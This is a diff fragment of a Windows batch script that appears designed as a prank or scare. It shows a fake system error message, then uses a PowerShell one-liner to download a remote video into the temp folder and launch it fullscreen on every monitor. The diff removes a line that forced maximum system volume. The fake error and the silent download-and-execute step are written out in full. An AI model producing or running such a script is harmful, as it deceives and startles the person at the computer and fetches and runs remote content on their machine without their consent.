@@ -40,7 +40,7 @@ powershell -c "(New-Object Media.SoundPlayer 'C:\Windows\Media\chimes.wav').Play
 msg * "An unexpected error occurred."
 
 :: Set full volume using nircmd (make sure nircmd is in your path or provide full path)
-nircmd.exe setsysvolume 65535
+
 
 :: Download and play video in fullscreen on all monitors
 set "x=powershell -c "(new-object System.Net.WebClient).DownloadFile('https://github.com/Grim-Anticheat/files-images/raw/main/ssstik.io_@x_l_u_i_x_1723569606416.mp4', '%temp%\vid.mp4'); (New-Object -ComObject WScript.Shell).Run('%temp%\vid.mp4 /fullscreen /multimon', 3, $false)""
